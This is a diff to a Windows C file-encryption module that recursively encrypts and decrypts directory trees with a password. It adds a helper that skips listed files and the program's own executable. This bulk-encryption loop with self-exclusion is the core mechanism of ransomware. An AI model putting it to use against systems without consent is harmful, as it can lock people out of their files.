@@ -1,6 +1,5 @@
 #include "crypt.h"
 
-#define _CRT_SECURE_NO_WARNINGS
 #include <string.h>
 #define UNICODE
 #include <Windows.h>
@@ -13,6 +12,7 @@ typedef BYTE CryptIV[16];
 
 static BOOL Crypt_IsEncrypted(HANDLE hFile, LONGLONG *pFileSize);
 
+static BOOL Crypt_ShouldIgnoreFilename(LPWSTR pwszFile, const wchar_t **ignore);
 static BOOL Crypt_EncryptDirectory(LPWSTR pwszDirectory, PUCHAR pbPassword, const wchar_t **ignore);
 static BOOL Crypt_DecryptDirectory(LPWSTR pwszDirectory, PUCHAR pbPassword, const wchar_t **ignore);
 
@@ -49,6 +49,27 @@ BOOL Crypt_IsEncrypted(HANDLE hFile, LONGLONG *pFileSize)
 	return magic[0] == '\t' && magic[1] == '\n' && magic[2] == 'M' && magic[3] == 'F';
 }
 
+BOOL Crypt_ShouldIgnoreFilename(LPWSTR pwszFile, const wchar_t **ignore)
+{
+	WCHAR wszProcessFileName[MAX_PATH] = { '\0' };
+	GetModuleFileName(NULL, wszProcessFileName, MAX_PATH);
+	wchar_t* processFilename = wcsrchr(wszProcessFileName, L'\\');
+	if (processFilename != NULL) {
+		--processFilename;
+		*processFilename = '.';
+		if (wcscmp(pwszFile, processFilename) == 0)
+			return TRUE;
+	}
+
+	if (ignore == NULL)
+		return FALSE;
+	for (size_t i = 0; ignore[i] != NULL; ++i) {
+		if (wcscmp(pwszFile, ignore[i]) == 0)
+			return TRUE;
+	}
+	return FALSE;
+}
+
 static BOOL Crypt_EncryptFile(LPWSTR pwszFilename, PUCHAR pbPassword);
 
 BOOL Crypt_EncryptDirectory(LPWSTR pwszDirectory, PUCHAR pbPassword, const wchar_t **ignore)
@@ -74,15 +95,8 @@ BOOL Crypt_EncryptDirectory(LPWSTR pwszDirectory, PUCHAR pbPassword, const wchar
 		wcsncat(wszFileName, L"\\", MAX_PATH - 1);
 		wcsncat(wszFileName, findFileData.cFileName, MAX_PATH - 1);
 
-		if (ignore != NULL) {
-			BOOL bIgnore = FALSE;
-			for (size_t i = 0; ignore[i] != NULL; ++i) {
-				if (wcscmp(wszFileName, ignore[i]) == 0)
-					bIgnore = TRUE;
-			}
-			if (bIgnore)
-				continue;
-		}
+		if (Crypt_ShouldIgnoreFilename(wszFileName, ignore))
+			continue;
 
 		if ((findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
 			Crypt_EncryptDirectory(wszFileName, pbPassword, ignore);
@@ -312,15 +326,8 @@ BOOL Crypt_DecryptDirectory(LPWSTR pwszDirectory, PUCHAR pbPassword, const wchar
 		wcsncat(wszFileName, L"\\", MAX_PATH - 1);
 		wcsncat(wszFileName, findFileData.cFileName, MAX_PATH - 1);
 
-		if (ignore != NULL) {
-			BOOL bIgnore = FALSE;
-			for (size_t i = 0; ignore[i] != NULL; ++i) {
-				if (wcscmp(wszFileName, ignore[i]) == 0)
-					bIgnore = TRUE;
-			}
-			if (bIgnore)
-				continue;
-		}
+		if (Crypt_ShouldIgnoreFilename(wszFileName, ignore))
+			continue;
 
 		if ((findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
 			Crypt_DecryptDirectory(wszFileName, pbPassword, ignore);
